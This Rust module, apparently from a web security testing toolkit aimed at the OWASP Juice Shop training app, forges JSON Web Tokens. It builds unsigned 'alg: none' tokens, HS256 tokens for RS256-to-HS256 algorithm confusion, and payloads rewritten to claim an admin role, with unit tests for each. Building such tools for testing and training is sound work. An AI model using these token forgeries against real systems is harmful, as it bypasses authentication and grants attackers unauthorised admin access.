//! JWT manipulation utilities for security testing
//!
//! Supports algorithm confusion, unsigned JWT, and claim manipulation.

use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use hmac::{Hmac, Mac};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::Sha256;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum JwtError {
    #[error("Invalid JWT format")]
    InvalidFormat,
    #[error("Base64 decode error: {0}")]
    Base64(#[from] base64::DecodeError),
    #[error("JSON parse error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("Invalid header")]
    InvalidHeader,
}

/// JWT header
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtHeader {
    pub alg: String,
    pub typ: String,
}

/// Decoded JWT structure
#[derive(Debug, Clone)]
pub struct DecodedJwt {
    pub header: Value,
    pub payload: Value,
    pub signature: Vec<u8>,
    pub raw_header: String,
    pub raw_payload: String,
}

impl DecodedJwt {
    /// Decode a JWT token without verification
    pub fn decode(token: &str) -> Result<Self, JwtError> {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            return Err(JwtError::InvalidFormat);
        }

        let header_bytes = URL_SAFE_NO_PAD.decode(parts[0])?;
        let payload_bytes = URL_SAFE_NO_PAD.decode(parts[1])?;
        let signature = URL_SAFE_NO_PAD.decode(parts[2]).unwrap_or_default();

        let header: Value = serde_json::from_slice(&header_bytes)?;
        let payload: Value = serde_json::from_slice(&payload_bytes)?;

        Ok(Self {
            header,
            payload,
            signature,
            raw_header: parts[0].to_string(),
            raw_payload: parts[1].to_string(),
        })
    }

    /// Get algorithm from header
    pub fn algorithm(&self) -> Option<&str> {
        self.header.get("alg").and_then(|v| v.as_str())
    }

    /// Get a claim value
    pub fn claim(&self, key: &str) -> Option<&Value> {
        self.payload.get(key)
    }
}

/// Create an unsigned JWT (alg: none)
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::jwt::create_unsigned_jwt;
/// use serde_json::json;
///
/// let payload = json!({
///     "sub": "admin",
///     "role": "admin",
///     "iat": 1234567890
/// });
///
/// let token = create_unsigned_jwt(&payload);
/// assert!(token.ends_with("."));
/// ```
pub fn create_unsigned_jwt(payload: &Value) -> String {
    let header = json!({
        "alg": "none",
        "typ": "JWT"
    });

    let header_b64 = URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
    let payload_b64 = URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());

    format!("{}.{}.", header_b64, payload_b64)
}

/// Create a JWT signed with HS256
///
/// Used for algorithm confusion attacks (RS256 -> HS256)
/// where the public key is used as the HMAC secret.
pub fn create_hs256_jwt(payload: &Value, secret: &[u8]) -> String {
    let header = json!({
        "alg": "HS256",
        "typ": "JWT"
    });

    let header_b64 = URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
    let payload_b64 = URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());

    let signing_input = format!("{}.{}", header_b64, payload_b64);

    let mut mac = Hmac::<Sha256>::new_from_slice(secret).expect("HMAC key can be any size");
    mac.update(signing_input.as_bytes());
    let signature = mac.finalize().into_bytes();

    let signature_b64 = URL_SAFE_NO_PAD.encode(signature);

    format!("{}.{}.{}", header_b64, payload_b64, signature_b64)
}

/// Modify JWT payload claims
pub fn modify_jwt_payload(token: &str, modifications: &Value) -> Result<String, JwtError> {
    let decoded = DecodedJwt::decode(token)?;
    let mut payload = decoded.payload;

    if let (Some(payload_obj), Some(mod_obj)) = (payload.as_object_mut(), modifications.as_object())
    {
        for (key, value) in mod_obj {
            payload_obj.insert(key.clone(), value.clone());
        }
    }

    // Return unsigned JWT with modified payload
    Ok(create_unsigned_jwt(&payload))
}

/// JWT algorithm variants for testing
pub fn jwt_algorithm_variants() -> Vec<&'static str> {
    vec![
        "none", "None", "NONE", "nOnE", "HS256", "HS384", "HS512", "RS256", "RS384", "RS512",
        "ES256", "ES384", "ES512", "PS256", "PS384", "PS512",
    ]
}

/// Common JWT attack payloads for Juice Shop
pub fn juice_shop_jwt_attacks() -> Vec<JwtAttack> {
    vec![
        JwtAttack {
            name: "Unsigned JWT (alg: none)".to_string(),
            description: "Remove signature and set algorithm to none".to_string(),
            attack_type: JwtAttackType::UnsignedJwt,
        },
        JwtAttack {
            name: "Algorithm Confusion (RS256 -> HS256)".to_string(),
            description: "Use public key as HMAC secret".to_string(),
            attack_type: JwtAttackType::AlgorithmConfusion,
        },
        JwtAttack {
            name: "Privilege Escalation".to_string(),
            description: "Modify role claim to admin".to_string(),
            attack_type: JwtAttackType::ClaimModification,
        },
    ]
}

#[derive(Debug, Clone)]
pub struct JwtAttack {
    pub name: String,
    pub description: String,
    pub attack_type: JwtAttackType,
}

#[derive(Debug, Clone)]
pub enum JwtAttackType {
    UnsignedJwt,
    AlgorithmConfusion,
    ClaimModification,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_jwt() {
        // Standard JWT test token
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

        let decoded = DecodedJwt::decode(token).unwrap();
        assert_eq!(decoded.algorithm(), Some("HS256"));
        assert_eq!(decoded.claim("sub"), Some(&json!("1234567890")));
        assert_eq!(decoded.claim("name"), Some(&json!("John Doe")));
    }

    #[test]
    fn test_create_unsigned_jwt() {
        let payload = json!({
            "sub": "admin",
            "role": "admin"
        });

        let token = create_unsigned_jwt(&payload);
        assert!(token.ends_with('.'));

        let decoded = DecodedJwt::decode(&token).unwrap();
        assert_eq!(decoded.algorithm(), Some("none"));
        assert_eq!(decoded.claim("role"), Some(&json!("admin")));
    }

    #[test]
    fn test_create_hs256_jwt() {
        let payload = json!({
            "sub": "admin",
            "iat": 1234567890
        });

        let token = create_hs256_jwt(&payload, b"secret");
        let parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts.len(), 3);
        assert!(!parts[2].is_empty());
    }

    #[test]
    fn test_modify_jwt_payload() {
        let token =
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.xxx";

        let modifications = json!({
            "role": "admin"
        });

        let modified = modify_jwt_payload(token, &modifications).unwrap();
        let decoded = DecodedJwt::decode(&modified).unwrap();
        assert_eq!(decoded.claim("role"), Some(&json!("admin")));
    }
}
